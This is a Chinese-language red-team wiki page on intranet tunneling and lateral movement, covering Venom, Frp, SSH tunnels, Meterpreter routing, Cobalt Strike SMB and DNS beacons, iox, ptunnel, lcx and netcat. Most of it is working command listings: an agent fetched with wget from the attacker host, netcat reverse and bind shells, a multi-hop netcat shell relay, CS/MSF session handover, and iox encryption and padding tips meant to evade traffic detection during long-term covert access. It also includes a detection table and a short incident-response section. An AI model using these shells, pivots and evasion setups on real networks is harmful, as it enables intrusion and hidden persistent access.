## 核心概念与技术分层

内网穿透与横向移动是渗透测试后期渗透阶段的核心技术，主要解决**边界防火墙限制**、**网络隔离**、**非直连网络访问**等问题。技术体系可分为四层：

| 层级 | 核心任务 | 典型技术/工具 |
|------|----------|---------------|
| **通道建立层** | 突破网络边界，建立加密隧道 | SSH 隧道、VPN、反向 Shell、WebShell 隧道、ICMP隧道、DNS隧道、iox 反向代理 |
| **代理协议层** | 统一流量出口，支持多协议转发 | SOCKS4/5、HTTP/HTTPS、TCP/UDP 转发、端口转发 |
| **工具链适配层** | 让现有工具透明走代理 | Proxychains、Proxytool、Tun2Socks、Redir |
| **C2 集成层** | 与命令控制框架深度融合 | Meterpreter 路由、Cobalt Strike SMB Beacon、Covenant P2P、CS&MSF 会话移交 |

> **关键区别**：**正向代理**由攻击方发起连接至跳板；**反向代理**由目标主动连回攻击方。内网渗透中反向连接更易绕过出站策略。

> **隧道 vs 代理**：代理主要解决访问问题（转发流量）；隧道技术解决**数据通信被拦截**时，通过封装改变通信协议绕过拦截（如 CS、MSF 无法上线、数据传输不稳定无回显、出口数据被监控）。

## 主流隧道/代理工具深度对比

### Venom（多协议内网渗透代理框架）

**定位**：多协议、多平台、可插拔的内网渗透代理框架（Go 编写）

**核心架构**：
- **Admin (Server)**：监听控制端口（默认 7777），管理 Agent 节点
- **Agent (Client)**：部署在目标主机，反向连接 Admin
- **插件化传输**：支持 TCP、WS、WSS、KCP、QUIC 等

**实战配置**：
```bash
# Kali (Admin)
./admin_linux_x64 -lport 7777

# 目标主机 (Agent)
wget http://<Kali_IP>:81/agent_linux_x64
chmod +x agent_linux_x64
./agent_linux_x64 -rhost <Kali_IP> -rport 7777

# Admin 交互
Venom> show           # 列出在线节点
Venom> goto 1         # 进入节点 1
Venom> socks 1080     # 在本地 1080 启动 SOCKS5 代理
```

**优势**：单二进制、免安装、支持多级级联、流量特征可定制。

### Frp（高性能反向代理）

**核心模式**参见 [[frp内网渗透应用]]：
| 模式 | 适用场景 | 关键配置 |
|------|----------|----------|
| **TCP/UDP 转发** | 单端口服务映射（RDP、SSH、数据库） | `type = tcp`, `local_port`, `remote_port` |
| **SOCKS5 代理** | 全流量代理，配合 Proxychains | `type = tcp`, `plugin = socks5` |
| **HTTP/HTTPS 代理** | Web 漏洞扫描、API 调用 | `type = http`, `plugin = http_proxy` |
| **多级级联** | 多层内网穿透 | `proxy_protocol_version = v2` |

### SSH 隧道（原生无依赖）

**三大隧道模式**：

| 模式 | 命令模板 | 数据流向 | 典型用途 |
|------|----------|----------|----------|
| **本地转发** | `ssh -L <LPORT>:<RHOST>:<RPORT> user@<JUMP>` | 攻击机 LPORT → Jump → RHOST:RPORT | 访问目标内网 Web/数据库 |
| **远程转发** | `ssh -R <RPORT>:<RHOST>:<LPORT> user@<JUMP>` | Jump RPORT → 攻击机 LPORT → RHOST | 反弹内网服务到公网跳板 |
| **动态转发** | `ssh -D <LPORT> user@<JUMP>` | 攻击机 LPORT (SOCKS5) → Jump → 任意目标 | 全工具代理化，**最常用** |

### Meterpreter 路由（Metasploit 原生）

```msf
route add <TARGET_NETWORK> <NETMASK> <SESSION_ID>
route print
use auxiliary/server/socks_proxy
set SRVPORT 1080
set SRVHOST 0.0.0.0
run
```

### Cobalt Strike SMB Beacon（命名管道隐蔽通信）

架构详解参见 [[cobalt-strike-external-c2-smb-beacon]]、[[smb-named-pipe-c2-communication]]、[[named-pipe-smb-detection-sysmon]]：
- **SMB Listener** 监听命名管道（默认 `msagent_`）
- **SMB Beacon** 通过 `\\<HOST>\pipe\<PIPE>` 通信
- **link/unlink** 建立/断开 P2P 管道连接
- **jump psexec** 利用 SMB + 服务安装横向移动

### Covenant / Covenant P2P（.NET 跨平台 C2）

参见 [[covenant-c2-framework-analysis]]：
- **HTTP Egress**：基于 HTTP/2 的出站通信
- **SMB Named Pipe P2P**：Beacon 间组网
- **External C2 规范**：可接入第三方通信通道

### iox（流量对抗型反向代理工具）

**定位**：专为红队实战设计的轻量级反向代理，**核心优势在于协议层面的流量对抗能力**——具备加密握手、随机 Padding、协议栈可重构三大特性，专门对抗沙箱流量监控与被动测绘识别。

详细技术深度解析参见 [[iox-proxy-protocol-evasion]]。

#### 核心架构与握手协议

iox 内置极简控制协议，明文模式下极易被识别：

```go
const (
    CTL_HANDSHAKE = iota
    CTL_CONNECT_ME
    CTL_CLEANUP
    MAX_CONNECTION   = 0x800
    CLIENT_HANDSHAKE = 0xc0
    SERVER_HANDSHAKE = 0xe0
)

type Protocol struct {
    CMD byte
    N   byte
}
var PROTO_END = []byte{0xee, 0xff}
```

**明文握手特征**：`CLIENT_HANDSHAKE (0xc0)` + `SERVER_HANDSHAKE (0xe0)` + `PROTO_END (0xee 0xff)` 固定字节序列，极易编写特征规则匹配。

#### 加密模式（v0.5+）与随机 IV 机制

开启加密（`-k <key>`）后，握手流程变为：
1. C/S 交换 **24 bytes 随机 IV**（Encrypt IV / Decrypt IV 各 24 字节）
2. 后续通信经加密器（AES-CTR 等）处理
3. 监控设备仅能看到 32 字节全随机数据，**无固定特征**，同进程多连接每次 IV 均不同

#### 随机 Padding 对抗行为特征分析

仅靠随机 IV 不足："先交换 24 字节再交换 8 字节"的**时序行为**仍可被建模。iox 引入**四层独立随机 Padding**：

| Padding 类型 | 长度派生算法 |
|-------------|-------------|
| Server Handshake Padding | `Secret Key` 前 16 字节求和 mod 256 |
| Client Handshake Padding | `Secret Key` 后 16 字节求和 mod 256 |
| Encrypt IV Padding | Encrypt IV 24 字节逐位异或 `Secret Key` 求和 mod 256 |
| Decrypt IV Padding | Decrypt IV 24 字节逐位异或 `Secret Key` 求和 mod 256 |

> `Secret Key` = 命令行密钥 SHA256 得到的 32 字节

**效果**：握手包总长度完全随机化，仅知密钥者可还原，流量侧无法推断 Padding 边界。

#### 多路复用（smux）元数据泄露问题与协议栈重构

开启多路复用（`-x` / `sx@`）时，原架构顺序为：
```
应用层 → smux（明文元数据） → 加密器 → TCP
```
导致 smux 包头（如 `0x02` 标识）明文泄露，**极易被识别为 smux 流量**。

**解决方案：协议栈下沉重构**
```
应用层 → 加密器 → smux → TCP
```
将加密层置于多路复用之下，smux 元数据亦被加密。**仅需修改 `SocketDesc` 中层级组装逻辑**，配合 `ListenerWrapper` 统一处理多路复用与否的 Listener 差异。

**重构后流量特征**：全随机高熵字节流，无任何协议固定特征。

#### 实战操作速查

```bash
# 服务端（目标内网跳板）
iox proxy s@tcp:127.0.0.1:9999 -k <强随机密钥>       # 纯 TCP 加密
iox proxy sx@tcp:127.0.0.1:9999 -k <强随机密钥>      # 多路复用+加密（推荐）

# 客户端（攻击机）
iox proxy c@tcp-l:1080 -k <强随机密钥>               # 本地 SOCKS5 1080
iox proxy cx@tcp-l:1080 -k <强随机密钥>              # 多路复用客户端
```

**红队实战铁律**：
1. **永远开启加密**（`-k`）
2. **每次行动更换高熵密钥**（建议 32+ 字符随机串）
3. **优先使用多路复用模式**（`sx@`/`cx@`）提升并发性能与隐蔽性
4. **结合 [[c2-redirectors-malleable-c2-profiles]] 重定向器**进一步混淆 C2 流量指纹

---

## 补充实战隧道技术细节（XD安全 Day71-72 笔记）

### 网络层：ICMP 隧道 - ptunnel

**原理**：将 TCP 流量封装在 ICMP Echo Request/Reply 包中传输，利用防火墙通常放行 ICMP 的特性绕过封锁。

**实验拓扑**：
```
Kali (攻击机) → Target2 (跳板/代理端) → Target3 (目标内网主机 3389 RDP)
```

**部署步骤**：

1. **目标端部署 Agent**（Target2）：
```bash
# 上传 ptunnel 到 Target2 Web 目录
# 在 Target2 启动 ptunnel 服务端（监听 ICMP，转发到本地/远程 TCP 端口）
ptunnel -r <Target2_IP> -lp 1080 -da <Target3_IP> -dp 3389
# -r: 远程代理端 IP（Target2 自身）
# -lp: 本地监听端口（SOCKS 代理端口）
# -da: 目标主机 IP（Target3）
# -dp: 目标端口（3389 RDP）
```

2. **攻击机连接**：
```bash
# Kali 启动 ptunnel 客户端连接 Target2
ptunnel -p <Target2_IP> -lp 1080 -da <Target3_IP> -dp 3389
# -p: 代理服务器 IP（Target2）
```

3. **验证流量**：
- Wireshark 抓包显示 ICMP Echo Request/Reply 往返
- 目标主机 Target3 看到 3389 端口连接来自 Target2（实际为 Kali 经 ICMP 隧道转发）
- 攻击机连接本地 1080 端口即可访问 Target3:3389 RDP

**特点**：老工具，稳定性一般，新场景推荐使用 `icmptunnel`、`icmpsh` 或 `PowerShell ICMP Tunnel` 等现代实现。

### 传输层：端口转发 - lcx / Portmap

**工具对应**：
- **Windows**：`lcx.exe`（经典端口转发工具）
- **Linux**：`portmap` / `portmp` / `socat` / `rinetd`

**lcx 两种工作模式**：

| 模式 | 命令语法 | 说明 |
|------|----------|------|
| **Slave（反向连接）** | `lcx -slave <攻击机IP> <攻击机端口> <本地目标IP> <本地目标端口>` | 目标主机主动连回攻击机，将本地服务映射到攻击机端口 |
| **Listen（监听转发）** | `lcx -listen <监听端口> <转发目标端口>` | 攻击机监听端口，转发至目标端口 |

**实战案例（域环境 3389 RDP 转发）**：
```
拓扑：Kali(攻击机) ← Webserver(跳板) → 目标主机
```

1. **目标主机执行 Slave 反向连接**：
```cmd
lcx.exe -slave <Kali_IP> 3131 127.0.0.1 3389
# 将本地 3389 反向映射到 Kali 的 3131 端口
```

2. **攻击机执行 Listen 监听转发**：
```cmd
lcx.exe -listen 3131 3333
# 监听本地 3131，转发至本地 3333
```

3. **攻击机连接本地 3333 即访问目标 3389**：
```bash
rdesktop 127.0.0.1:3333
```

**Portmap (Linux) 类似用法**：
```bash
# 反向映射
./portmap -r <攻击机IP>:<攻击机端口> -l <本地目标IP>:<本地目标端口>
# 或使用 socat
socat TCP4-LISTEN:3131,fork TCP4:127.0.0.1:3389
```

### 传输层：Netcat 多向连接反弹 Shell

**Netcat 核心功能**：
- 正向/反向 Shell
- 端口扫描、服务指纹识别
- 文件传输
- 多级跳板连接

#### 正向连接（攻击机连受害机）
```bash
# 受害机监听
# Linux
nc -ldp 1234 -e /bin/sh
# Windows
nc -ldp 1234 -e c:\windows\system32\cmd.exe

# 攻击机连接
nc <受害机IP> 1234
```

#### 反向连接（受害机连攻击机）
```bash
# 攻击机监听
nc -lvp 1234

# 受害机反连
# Linux
nc <攻击机IP> 1234 -e /bin/sh
# Windows
nc <攻击机IP> 1234 -e c:\windows\system32\cmd.exe
```

#### 多向连接/跳板反弹 Shell（核心实战技巧）

**场景**：攻击机无法直连目标内网主机，需经跳板机中转。

**拓扑**：
```
Kali(攻击机) ← God/Webserver(跳板) → SQLServer/DC(目标)
```

**操作流程**：

1. **攻击机启动监听**：
```bash
nc -lvp 4444
```

2. **跳板机建立转发通道**（将目标 Shell 反弹给攻击机）：
```bash
# 跳板机连接目标主机的 nc 监听端口，并将流量管道转发给攻击机
nc <目标IP> <目标端口> | nc <攻击机IP> 4444
# 或使用双管道实现全双工
nc <目标IP> <目标端口> 0<&1 | nc <攻击机IP> 4444
```

3. **目标主机执行反向 Shell 连跳板机**：
```bash
# 目标主机反连跳板机
nc <跳板机IP> <跳板监听端口> -e /bin/sh
```

**效果**：攻击机在 4444 端口直接获得目标主机的 Shell，中间经跳板机转发，流量在跳板机呈现为普通 TCP 连接。

#### Netcat 辅助功能
```bash
# 服务指纹识别
nc -nv <IP>

# 端口扫描
nc -v -z <IP> 1-100

# 端口监听
nc -lvp <PORT>

# 文件传输（接收端）
nc -lp 1111 > 1.txt

# 文件传输（发送端）
nc -vn <IP> 1111 < 1.txt -q 1
```

> **注意**：现代系统 `nc` 多为 OpenBSD 版本（无 `-e` 选项），需使用 `ncat` (Nmap 自带)、`socat` 或编译支持 `-e` 的传统版本。Windows 下常用 `nc64.exe`。

### 应用层：DNS 隧道配合 Cobalt Strike 上线

**适用场景**：常见协议（HTTP/HTTPS/TCP）监听器被拦截，DNS 协议通常放行且监控较弱，**基本通杀**。

**前置条件**：
- 拥有一个可控域名（如 `xiaodi8.com`）
- 团队服务器公网 IP
- Cobalt Strike Team Server

**配置步骤**：

#### Team Server 开启 UDP 53 端口
确保服务器防火墙/安全组放行 UDP 53。

#### 域名解析配置（关键）
| 记录类型 | 主机记录 | 记录值 | 说明 |
|----------|----------|--------|------|
| **A** | `cs` | Team Server 公网 IP | CS 服务器主机名解析 |
| **NS** | `ns1` | `cs.xiaodi8.com` | 委派子域名解析到 CS 服务器 |
| **NS** | `ns2` | `cs.xiaodi8.com` | 备用 NS 记录 |

**效果**：`*.xiaodi8.com` 的 DNS 查询将委派给 `cs.xiaodi8.com` (Team Server) 处理，Cobalt Strike 的 DNS Beacon 即通过该机制通信。

#### Cobalt Strike 配置 DNS 监听器
在 CS 客户端添加监听器：
- **Host (DNS)**：`ns1.xiaodi8.com`、`ns2.xiaodi8.com`
- **Host (HTTP)**：`cs.xiaodi8.com` (用于 Stage 下载)
- **Port**：53
- **Profile**：可选 Malleable C2 Profile 混淆流量

#### 生成并执行 DNS Beacon
```bash
# CS 生成 Payload：Artifact Template → DNS Beacon
# 上传目标主机执行
# 上线后可能需执行几条命令才稳定（DNS 通信延迟高、速度慢）
```

**DNS Beacon 特点**：
- 通信速度慢、延迟高
- 适合低频心跳、关键命令下发
- 流量极难被常规防火墙/IPS 识别拦截
- 可配合 `maxdns`、`dns_idle`、`dns_sleep` 等 Profile 参数调优

**学习意义**：当 HTTP/HTTPS/TCP 被封锁时，DNS 隧道提供**应用层协议级**的备用通道，是红队持久化访问的重要手段。

---

## 代理协议与工具链适配

### SOCKS5 vs HTTP 代理选型

| 维度 | SOCKS5 | HTTP/HTTPS 代理 |
|------|--------|-----------------|
| **协议支持** | TCP/UDP/ICMP (SOCKS5) | 仅 TCP (HTTP CONNECT) |
| **认证** | 用户名/密码、GSS-API | Basic/Digest/NTLM |
| **工具兼容性** | Proxychains、Nmap、MSF、Curl | 浏览器、Burp、SQLMap、大多数 CLI |
| **流量特征** | 握手明文可识别 | 类似正常 Web 流量，易混淆 |

**建议**：内网扫描/爆破用 SOCKS5（Nmap `-sT` 需 TCP Connect）；Web 漏洞利用用 HTTP 代理（Burp、SQLMap 原生支持）。

### Proxychains / Proxychains4（全工具代理化标配）

**配置文件 `/etc/proxychains4.conf` 关键点**：
```conf
# 代理链模式
strict_chain   # 所有代理必须可用（默认）
dynamic_chain  # 至少一个可用即可
random_chain   # 随机顺序

# 代理列表（支持混合协议）
socks5 127.0.0.1 1080   # Venom/Frp/SSH -D/ptunnel/iox
socks4 127.0.0.1 1081   # MSF SOCKS4a
http   127.0.0.1 8080   # HTTP 代理

# DNS 解析防泄露
proxy_dns
remote_dns_subnet 224
```

**使用模式**：
```bash
# 单命令代理化
proxychains nmap -sT -Pn 172.17.0.2

# 交互式 Shell 代理化
proxychains bash

# 指定配置文件
proxychains -f /custom/proxychains.conf <cmd>
```

### 进阶方案：Tun2Socks / Redir / Proxytool

| 工具 | 原理 | 适用场景 |
|------|------|----------|
| **Tun2Socks** | 虚拟网卡 (TUN) + 用户态 SOCKS5 协议栈 | 系统级全流量代理、容器/K8s 网络透明代理 |
| **Redir (iptables REDIRECT)** | 内核态 DNAT 重定向至本地代理端口 | 透明代理、无需修改应用 |
| **Proxytool (Go)** | 类 Proxychains 但支持静态二进制、UDP、多核 | Go/Rust 静态工具、高并发扫描 |

---

## 实战场景交叉引用

### 场景一：VulnHub Social Network（Venom + Proxychains 完整复现）

详见 [[vulnhub-boredhackerblog-social-network-writeup]]。

**攻击链**：
1. Web RCE → 反弹 Shell (容器)
2. 容器逃逸/内网发现 → 识别 `172.17.0.0/16`
3. **Venom 反向 SOCKS5** 穿透至 Kali
4. **Proxychains + Nmap** 扫描内网
5. 利用 Elasticsearch RCE 拿下容器
6. 密码哈希破解 → SSH 横向登录宿主
7. **本地提权 (CVE-2013-2094)** → Root

### 场景二：CTFd-Whale 动态靶机集群（Frp 多级级联）

参见 [[frp内网渗透应用]]。

### 场景三：Cobalt Strike SMB Beacon 域环境横向

参见 [[cobalt-strike-external-c2-smb-beacon]]、[[smb-named-pipe-c2-communication]]。

### 场景四：GKCTF2021 hackme - Frp 代理内网 WebLogic + CVE-2020-14882

详见 [[gkctf-2021-web-writeup]]。

### 场景五：iox 实战部署建议

在需要**长期驻留、高隐蔽性**的红队行动中，建议：
1. **首选 iox 加密多路复用模式** 作为主要隧道通道
2. **配合 Frp/Venom 作为备用通道**（工具多样性降低单点特征概率）
3. **关键节点部署 iox Agent**，通过协议栈重构特性对抗沙箱流量监控与威胁狩猎平台被动测绘
4. **定期轮换密钥与端口**，结合 [[c2-redirectors-malleable-c2-profiles]] 实施 C2 基础设施轮换

---

## CS & MSF 会话移交（Day72 实战）

### CS → MSF（Spawn 会话）

1. **CS 创建监听器**（指向 MSF 所在服务器 IP/端口）
2. **MSF 启动对应 Payload 监听器**（协议、端口与 CS 监听器一致）
   ```msf
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_http
   set LHOST <MSF_IP>
   set LPORT <PORT>
   run
   ```
3. **CS 目标会话右键 → Spawn → 选择该监听器**
4. **MSF 获得 Meterpreter 会话**

### MSF → CS（手动生成 Payload 回连）

1. **CS 创建监听器**（记录 Host/Port）
2. **MSF 会话中执行**：
   ```msf
   # 生成 CS 兼容的 Raw Payload
   use payload/windows/x64/meterpreter/reverse_http
   set LHOST <CS_TeamServer_IP>
   set LPORT <CS_Listener_Port>
   generate -f raw -o /tmp/cs.bin
   ```
3. **上传执行或通过 `execute -f` 落地运行**
4. **CS 获得 Beacon 会话**

**双向移交意义**：结合 CS 图形化横向、MSF 丰富模块库，实现**工具链互补**。

---

## 应急响应溯源基础（Day72 案例）

### 场景：网站首页被篡改，溯源分析

**分析维度**：
- 涉及攻击面、操作权限、攻击意图、攻击方式

**思路 1：日志定位法**
- 定位首页修改时间基数
- 前时间段：攻击入口分析（Web 攻击、上传、注入等）
- 后时间段：操作行为分析（文件写入、权限维持、横向等）

**思路 2：WebShell 查杀溯源法**
1. **查杀工具定位后门**：`D盾`、`河马webshell查杀`、`深信服 WebShell 检测` 等
2. **进程关联**：任务管理器/Process Explorer 找到 Web 进程（如 `httpd.exe`/`php-cgi.exe`）异常子进程
3. **网络连接确认**：`netstat -ano` / 资源监视器查看进程对外连接（确认为木马而非合法爬虫等）
4. **文件时间戳**：查看后门文件创建/修改时间，关联日志时间窗口
5. **日志回溯**：
   - Web 访问日志（Apache `access.log`、Nginx `access.log`、IIS 日志）
   - 筛选后门文件访问记录（如 `x.php`、`shell.php`）
   - 分析攻击者 IP、User-Agent、请求参数、上传路径

**关键证据链**：
```
后门文件发现 → 进程/网络确认恶意 → 文件时间戳 → Web日志关联攻击请求 → 还原攻击路径
```

---

## 检测与对抗视角

| 技术 | 主机层检测 | 网络层检测 | 对抗建议 |
|------|------------|------------|----------|
| **Venom/Frp** | 进程名、端口监听、二进制哈希 | 非标准端口长连接、TLS 指纹 | 重命名二进制、HTTPS/WSS 传输、CDN 前置 |
| **SSH 隧道** | `sshd` 子进程、`authorized_keys` 异常 | 22 端口长连接、SFTP 流量特征 | 密钥轮换、跳板机审计、限制 `PermitTunnel` |
| **ptunnel (ICMP)** | 异常 ICMP 发送进程、原始套接字使用 | 大量 ICMP Echo Request/Reply、载荷熵异常 | 限制 ICMP 速率、深度包检测识别隧道特征 |
| **lcx/Portmap** | 非系统二进制监听端口、进程链异常 | 端口转发特征（固定端口长连接） | 管道/命名管道替代、内存执行、编码混淆 |
| **Netcat** | `nc`/`ncat` 进程、`-e` 参数执行 Shell | 明文 TCP 交互、反连特征 | `socat`/`ncat --ssl` 加密、PowerShell 替代、内存加载 |
| **DNS 隧道 (CS)** | `nslookup`/`dig` 频繁调用、异常域名解析 | 高熵子域名、TXT/NULL 记录滥用、NXDOMAIN 泛滥 | DNS 日志审计、熵值检测、限制递归查询、Sinkhole 恶意域 |
| **Meterpreter 路由** | `meterpreter` 线程、注入进程 | 反向 TCP 特征、Sleep 模式 | `execute -f` 落地、Artifact Kit 定制、Sleep Mask |
| **SMB Beacon** | Sysmon ID 17/18 管道创建/连接 | SMB 会话异常、命名管道名 | 合法管道名伪装、`link` 后立即 `unlink`、P2P 而非集中式 |
| **CS&MSF 会话移交** | 进程注入、异常子进程、Payload 特征 | 双向连接建立、Stage 下载流量 | 无文件执行、重签名、Profile 混淆、延迟执行 |
| **iox (加密+多路复用)** | 进程名、内存特征、密钥常驻 | **全随机高熵流量、无固定特征、无协议指纹** | **轮换高熵密钥、多路复用模式、协议栈重构版本、配合重定向器** |

> **iox 检测难点**：加密握手+随机 Padding+协议栈重构使其**无静态特征、无行为固定模式**，传统特征匹配/行为建模均失效。检测侧需依赖：**主机端 EDR 行为监控（进程创建、网络连接、内存特征）、流量侧异常熵值统计分析、威胁情报关联已知 iox 样本哈希**。

详细检测规则参见 [[named-pipe-smb-detection-sysmon]]。

---

## 知识图谱导航

```mermaid
graph TD
    A[内网穿透/横向移动总览] --> B[通道建立层]
    A --> C[代理协议层]
    A --> D[工具链适配层]
    A --> E[C2 集成层]
    A --> F[补充隧道技术]
    A --> G[流量对抗型工具]
    
    B --> B1[SSH 隧道]
    B --> B2[Venom]
    B --> B3[Frp]
    B --> B4[WebShell 隧道]
    B --> B5[iox 反向代理]
    
    C --> C1[SOCKS5]
    C --> C2[HTTP/HTTPS]
    C --> C3[TCP/UDP 转发]
    
    D --> D1[Proxychains]
    D --> D2[Tun2Socks]
    D --> D3[Proxytool]
    
    E --> E1[Meterpreter 路由]
    E --> E2[CS SMB Beacon]
    E --> E3[Covenant P2P]
    E --> E4[CS&MSF 会话移交]
    
    F --> F1[ptunnel ICMP隧道]
    F --> F2[lcx/Portmap 端口转发]
    F --> F3[Netcat 多向连接]
    F --> F4[DNS隧道 CS上线]
    
    G --> G1[[iox-proxy-protocol-evasion]]
    G --> G2[加密握手+随机IV]
    G --> G3[随机Padding对抗行为建模]
    G --> G4[协议栈重构解决smux泄露]
    
    A --> H[实战场景]
    H --> H1[[vulnhub-boredhackerblog-social-network-writeup]]
    H --> H2[[frp内网渗透应用]]
    H --> H3[[cobalt-strike-external-c2-smb-beacon]]
    H --> H4[[gkctf-2021-web-writeup]]
    
    A --> I[检测对抗]
    I --> I1[[named-pipe-smb-detection-sysmon]]
    I --> I2[[c2-redirectors-malleable-c2-profiles]]
    I --> I3[[iox-proxy-protocol-evasion]]
    
    A --> J[应急响应]
    J --> J1[[xd-security-incident-response-notes]]
```



---

## 快速参考卡片

| 任务 | 首选方案 | 备选方案 | 关键命令/配置 |
|------|----------|----------|---------------|
| **单端口转发 (RDP/SSH)** | SSH `-L`/`-R` | Frp `type=tcp` / lcx | `ssh -L 3389:10.0.0.5:3389 user@jump` |
| **全流量 SOCKS5 代理** | SSH `-D` / Venom `socks` | Frp `plugin=socks5` / ptunnel / **iox** | `proxychains nmap -sT 10.0.0.0/24` |
| **多级内网级联** | Venom 多节点 `goto` | Frp `proxy_protocol_version=v2` / **iox 级联** | `Venom> goto 1 -> goto 2 -> socks 1080` |
| **域环境隐蔽横向** | CS SMB Beacon `link` | Covenant SMB P2P | `link DC01` → `jump psexec DC01 smb` |
| **MSF 模块内网扫描** | `route add` + `socks_proxy` | Venom/Frp/iox + Proxychains | `route add 10.0.0.0 255.255.255.0 1` |
| **静态二进制工具代理化** | Tun2Socks / Proxytool | Redir + iptables | `proxytool -proxy socks5://:1080 ./scanner` |
| **内网 Web 管理控制台访问** | Frp TCP 反向代理 | SSH `-L` 本地转发 / **iox TCP 转发** | `frpc.ini: [web] type=tcp local_port=7001 remote_port=7001` |
| **ICMP 协议穿透** | ptunnel / icmptunnel | PowerShell ICMP Tunnel | `ptunnel -p <proxy> -lp 1080 -da <target> -dp 3389` |
| **DNS 协议 C2 上线** | Cobalt Strike DNS Beacon | dnscat2 / iodine | 域名 NS 记录委派 → CS Listener Host=ns1.domain |
| **多跳板 Shell 反弹** | Netcat 管道转发 | socat / SSH 跳板 | `nc <target> <port> \| nc <attacker> 4444` |
| **CS ↔ MSF 会话移交** | CS Spawn / MSF generate raw | 手动上传执行 Payload | CS Listener → MSF handler → Spawn |
| **高隐蔽长期驻留隧道** | **iox 加密多路复用** (`sx@`/`cx@`) | Venom WSS / Frp KCP | `iox proxy sx@tcp:127.0.0.1:9999 -k <32字符强随机键>` |

---

## 延伸阅读与资源

- **工具仓库**：
  - Venom: https://github.com/Dliv3/Venom
  - Frp: https://github.com/fatedier/frp
  - iox: https://github.com/EddieIvan01/iox
  - Proxytool: https://github.com/ProxyTool/ProxyTool
  - Tun2Socks: https://github.com/xjasonlyu/tun2socks
  - ptunnel: https://github.com/utoni/ptunnel
  - lcx: https://github.com/guanxingbao/lcx (或搜索 lcx.exe)
  - ncat (Nmap): https://nmap.org/ncat/
- **实战靶场**：
  - VulnHub Social Network: [[vulnhub-boredhackerblog-social-network-writeup]]
  - CTFd-Whale: [[frp内网渗透应用]]
  - GKCTF2021 Web Writeup: [[gkctf-2021-web-writeup]]
  - 更多 VulnHub 靶机: [[vulnhub-platform-resource-index]]
- **C2 基础设施**：
  - 重定向器与 Malleable Profile: [[c2-redirectors-malleable-c2-profiles]]
  - Covenant 架构分析: [[covenant-c2-framework-analysis]]
- **网络基础**：
  - 渗透测试网络基础: [[network-fundamentals-penetration-testing]]
  - ARP 欺骗与中间人: [[0w1club-week2-wifi-hijacking-arp-spoofing]]、[[ettercap-arp-mitm-practical-guide]]
- **应急响应**：
  - XD安全应急响应笔记: [[xd-security-incident-response-notes]]
- **漏洞细节**：
  - CVE-2020-14882/14883 分析: https://github.com/GGyao/CVE-2020-14882_ALL
  - PHP Session Upload Progress 利用: https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/
  - NoSQL 注入综合指南: [[mongodb-nosql-injection-guide]]
  - iox 协议对抗深度解析: [[iox-proxy-protocol-evasion]]
- **红队工具开发参考**：
  - Rust 宏实现 Win32 动态导入: [[rust-proc-macro-win32-dynamic-import]]
  - PE 手动映射加载器实现: [[pe-manual-mapping-loader-implementation]]
  - 参数欺骗对抗 EDR: [[argument-spoofing-edr-evasion]]
  - PPL 进程注入绕过: [[ppl-injection-createprocess-bof-fix]]

---

## 来源

- [0x00实验室-202108-202304_066](../sources/0x00实验室-202108-202304_066.md)
- [0x00实验室-202108-202304_067](../sources/0x00实验室-202108-202304_067.md)
- [0x00实验室-202108-202304_104](../sources/0x00实验室-202108-202304_104.md)
- [0x4d5a-202103-202209_12](../sources/0x4d5a-202103-202209_12.md)
